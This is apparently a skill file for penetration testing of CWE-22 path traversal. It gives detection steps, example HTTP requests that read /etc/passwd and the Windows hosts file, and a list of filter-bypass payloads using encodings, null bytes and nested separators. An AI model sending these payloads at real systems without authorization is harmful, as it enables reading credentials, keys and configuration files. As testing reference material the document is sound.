
name: cwe-22-path-traversal
description: Use when a path/file param reads files outside the app dir.
version: 1.0.0
license: MIT
platforms: [linux, windows]
tags: [cwe, cwe-22, access-control, pentest, owasp, a01]
category: pentesting-skills
related_skills:
  - owasp-a01-broken-access-control
---

# CWE-22 - Path Traversal (Absolute & General)

CWE-22: Path Traversal (or 'Directory Traversal') occurs when an application builds a filesystem path from untrusted input without properly neutralizing '../', '/', absolute paths, or encoded variants, letting the attacker escape the webroot/data directory.

## Parent Skill

This is a sub-skill of `owasp-a01-broken-access-control` (OWASP A01 Broken Access Control, Top 10 2025).
Load the parent for overall A01 scope, validation criteria (negative control), and
the reporting template. This skill covers the CWE-22 detail: what to look for,
how to trigger it, and what a confirmed finding looks like.

## When to Use

- Use when a web parameter accepts a filename/path/url and can read files outside the intended directory (absolute path traversal).

## Detection & Test

1. Find every file-related parameter: file, path, dir, dirpath, document, pdf, doc, logo, image, page, view, template, style, config, filename.
2. Send a control request (returns a legit file), then mutate the value.
3. Iterate payload families: relative (../), absolute (/etc/passwd), encoded (%2e%2e%2f, %2e%2e/, ..%2f, .%2f, backslash, c:\windows\), nested (../../../../), null-byte (..%00 on legacy PHP), OS-specific separators.
4. Confirm a real difference in the response body vs. the neutralized/control response (file contents, HTTP status, or error message naming the path).
5. Test both query-string and path-info placement; URL-code the '..' only in the segment that reaches the filesystem.

## Example Requests

```http
GET /download?file=report.pdf
```
```http
GET /download?file=../../../etc/passwd
```
```http
GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
```http
GET /read?f=....//....//....//etc/passwd
```
```http
GET /file?path=c:\windows\system32\drivers\etc\hosts
```
```http
GET /download?file=..%00..%00..%00etc/passwd
```

## Bypass Tricks

- Double URL encoding: `..%252f` or `..%252e%252e%252f` to slip past a single decode.
- Case mixing on Windows: `..\..\WInDoWs\`.
- Null byte truncation: `..\..\..\etc\passwd%00.png` (pre-5.4 PHP, old CGI).
- Nested/combined: `....//....//....//etc/passwd` to bypass a `..` → `.` filter.
- Alternate separators: `/` vs `\` and `%5c` on Windows.
- Backslash on Linux: `..%5c..%5c` when the handler only normalizes `/`.
- Encoded variants: `%2e%2e%2f`, `..%2f`, `.%2f`, `%c0%ae%c0%ae/` (UTF-8 overlong).
- Trailing junk to evade extension whitelists: `passwd.php?real=file`.
- Relative from a deep base: append `../` more times than the base depth.
- Path parameter splitting: put traversal in a second param the app concatenates.


## Impact

- Read arbitrary server files: .env, config, source code, /etc/passwd, SSH keys, cloud-injected source files.

## See Also

- `owasp-a01-broken-access-control` - parent skill (A01 scope, Test Procedure, Validation, reporting).
- `owasp-top10-2025-testing` - top-level OWASP Top 10 2025 reference (full 249-CWE table, priority order).